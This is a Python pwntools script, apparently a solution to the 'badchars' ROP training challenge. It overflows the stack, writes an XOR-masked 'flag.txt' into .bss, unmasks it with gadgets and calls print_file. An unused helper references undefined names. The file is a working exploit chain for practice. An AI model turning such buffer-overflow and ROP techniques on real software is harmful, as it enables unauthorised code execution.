#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# break apres le read dans pwnme
gs='''
b *pwnme+268
c
'''

# Gadgets 
# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r12345=0x40069c
# 0x00000000004006a2 : pop r15 ; ret
pop_r15 = 0x4006a2
#0x400634 : mov qword ptr [r13], r12 ; ret
write_r13r12=0x400634
# pop rdi ; ret
pop_rdi = 0x4006a3
#0x0000000000400628 : xor byte ptr [r15], r14b ; ret
xor_r15 = 0x400628

def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p64(pop_r1415)
        r += p64(addr)
        r += data[i:i+8]
        r += p64(write_r14)
    return r


def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('badchars')
context.binary=elf

print_file=elf.plt['print_file']

bss = 0x00601038

flagxored = xorchain(b"flag.txt",0b00111010,3)

PL =b"A"*offset
PL+=p64(pop_r12345)
PL+=flagxored
PL+=p64(bss)
PL+=p64(3)
PL+=p64(bss+2)
PL+=p64(write_r13r12)

PL+=p64(xor_r15)

PL+=p64(pop_r15)
PL+=p64(bss+3)
PL+=p64(xor_r15)

PL+=p64(pop_r15)
PL+=p64(bss+4)
PL+=p64(xor_r15)

PL+=p64(pop_r15)
PL+=p64(bss+6)
PL+=p64(xor_r15)

PL+=p64(pop_rdi)
PL+=p64(bss)
PL+=p64(print_file)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    #gdb.attach(io,gs)
    #time.sleep(1)
    io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()

